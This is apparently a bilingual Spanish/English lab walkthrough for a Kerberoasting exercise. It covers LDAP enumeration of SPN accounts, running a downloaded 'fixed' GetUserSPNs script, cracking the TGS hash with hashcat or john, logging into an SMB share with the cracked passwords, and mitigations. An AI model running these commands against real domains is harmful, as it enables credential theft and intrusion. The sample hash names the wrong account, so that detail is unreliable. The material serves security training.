Objetivo

Hay cuentas de usuario con SPN registrado, así que cualquier usuario autenticado puede pedir su ticket de servicio. Solicita el TGS-REP, crackea el hash krb5tgs y accede con esas credenciales a //DC01/sqldata.

Flag: //{{ ad_dc_host }}/sqldata/flag-ad-05.txt — captúrala en el Domain Controller y valídala en la barra lateral.

{% include 'labs/_ad_target.html' %}

Nota sobre este Domain Controller

impacket-GetUserSPNs tal cual falla contra este DC por dos bugs distintos: (1) su enumeración LDAP automática usa el bind NTLM/Sicily que Samba no implementa (ver AD 02); y (2), aunque te lo saltes, el TGS-REQ que pide el ticket de servicio revienta con KRB_AP_ERR_INAPP_CKSUM porque impacket no envía el checksum keyed que el KDC de Samba exige en el Authenticator (RFC 4120 §5.5.1) — algo que Windows recibe casi siempre de sus propios clientes, por eso el bug de impacket pasa desapercibido en producción. Root cause identificado y arreglado: descarga GetUserSPNs_fixed.py del share public — pide el TGS con ese checksum añadido y produce un hash real, obtenido en vivo, no uno pre-capturado.

Inicio rápido

# Descargar el script que arregla el TGS-REQ contra este DC
smbclient -N //{{ ad_dc_ip }}/public -c 'get GetUserSPNs_fixed.py'

# Pedir el TGS de verdad y crackearlo
python3 GetUserSPNs_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
  -spn 'MSSQLSvc/{{ ad_dc_fqdn }}:1433' -dc-ip {{ ad_dc_ip }} -outputfile tgs.hash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt

1 · Por qué funciona

Cualquier usuario autenticado puede pedir al KDC un ticket de servicio (TGS) para cualquier SPN del dominio. Ese ticket va cifrado con la clave de la cuenta que tiene el SPN. Si el SPN está en una cuenta de usuario (no en una cuenta de máquina, cuya contraseña es aleatoria de 120 caracteres), el hash resultante se puede crackear offline sin tocar el DC.

2 · Localizar cuentas con SPN (esto sí funciona en vivo)

ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" \
  '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName
ServicePrincipalName                        Name          MemberOf
------------------------------------------  ------------  --------
MSSQLSvc/{{ ad_dc_fqdn }}:1433              svc.mssql
HTTP/web.{{ ad_realm_lower }}               svc.delegate

3 · Solicitar el ticket de verdad (funciona en vivo, no es una captura)

impacket-GetUserSPNs '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
  -dc-ip {{ ad_dc_ip }} -request -outputfile tgs.hash
# [-] Kerberos SessionError: KRB_AP_ERR_INAPP_CKSUM(Inappropriate type of checksum in message)

Root cause: el Authenticator que getKerberosTGS() de impacket construye para el TGS-REQ nunca incluye el campo cksum. RFC 4120 §5.5.1 define ese checksum como un keyed checksum (key usage 6) sobre la codificación de KDC-REQ-BODY, calculado con la session key del TGT. Windows AD lo recibe de sus propios clientes casi siempre, así que nunca notó que faltaba — pero el KDC de Samba lo exige de verdad, y al no recibirlo responde KRB_AP_ERR_INAPP_CKSUM. Confirmado en vivo con una petición TGS-REQ cruda añadiendo ese checksum: el KDC responde con un TGS-REP perfectamente válido.

smbclient -N //{{ ad_dc_ip }}/public -c 'get GetUserSPNs_fixed.py'

python3 GetUserSPNs_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
  -spn 'MSSQLSvc/{{ ad_dc_fqdn }}:1433' -dc-ip {{ ad_dc_ip }} -outputfile tgs.hash

cat tgs.hash
# $krb5tgs$23$*svc.readonly${{ ad_realm }}$MSSQLSvc/...*$...

El hash resultante es 100% real (se obtiene del TGS-REP genuino que devuelve el KDC), no uno "capturado" de antemano.

4 · Crackear offline

# hashcat (modo 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --force

# john
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash

La contraseña recuperada es ranger (la de svc.mssql). Guárdala: también existe svc.delegate : iloveyou1, que usarás en el lab AD 14.

5 · Capturar la flag

nxc smb {{ ad_dc_ip }} -u 'svc.mssql' -p 'ranger' --shares

smbclient //{{ ad_dc_ip }}/sqldata -U '{{ ad_domain }}\svc.mssql%ranger' -c 'get flag-ad-05.txt'
cat flag-ad-05.txt

Mitigación

  • Migrar las cuentas de servicio con SPN a gMSA (contraseña de 240 bits rotada automáticamente).
  • Forzar AES en Kerberos y prohibir RC4 (msDS-SupportedEncryptionTypes).
  • Nunca poner cuentas con SPN dentro de Domain Admins; auditar eventos 4769 con RC4.

1 · Why it works

Any authenticated user can ask the KDC for a service ticket (TGS) for any SPN in the domain. That ticket is encrypted with the key of the account holding the SPN. If the SPN sits on a user account (not a machine account, whose password is a random 120-character string), the resulting hash can be cracked offline without ever touching the DC again.

2 · Find accounts with an SPN (this works live)

ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" \
  '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName
ServicePrincipalName                        Name          MemberOf
------------------------------------------  ------------  --------
MSSQLSvc/{{ ad_dc_fqdn }}:1433              svc.mssql
HTTP/web.{{ ad_realm_lower }}               svc.delegate

3 · Request the ticket for real (this works live, not a capture)

impacket-GetUserSPNs '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
  -dc-ip {{ ad_dc_ip }} -request -outputfile tgs.hash
# [-] Kerberos SessionError: KRB_AP_ERR_INAPP_CKSUM(Inappropriate type of checksum in message)

Root cause: the Authenticator that impacket's getKerberosTGS() builds for the TGS-REQ never includes the cksum field. RFC 4120 §5.5.1 defines that checksum as a keyed checksum (key usage 6) over the encoding of KDC-REQ-BODY, computed with the TGT's session key. Windows AD almost always gets it from its own clients, so it never noticed it was missing — but Samba's KDC genuinely requires it, and without it responds KRB_AP_ERR_INAPP_CKSUM. Confirmed live by sending a raw TGS-REQ with that checksum added: the KDC replies with a perfectly valid TGS-REP.

smbclient -N //{{ ad_dc_ip }}/public -c 'get GetUserSPNs_fixed.py'

python3 GetUserSPNs_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
  -spn 'MSSQLSvc/{{ ad_dc_fqdn }}:1433' -dc-ip {{ ad_dc_ip }} -outputfile tgs.hash

cat tgs.hash
# $krb5tgs$23$*svc.readonly${{ ad_realm }}$MSSQLSvc/...*$...

The resulting hash is 100% real (it comes from the genuine TGS-REP the KDC returns), not a pre-"captured" one.

Mitigation

  • Move SPN-bearing service accounts to gMSA (240-bit password rotated automatically).
  • Enforce AES for Kerberos and forbid RC4 (msDS-SupportedEncryptionTypes).
  • Never place SPN accounts inside Domain Admins; audit 4769 events using RC4.
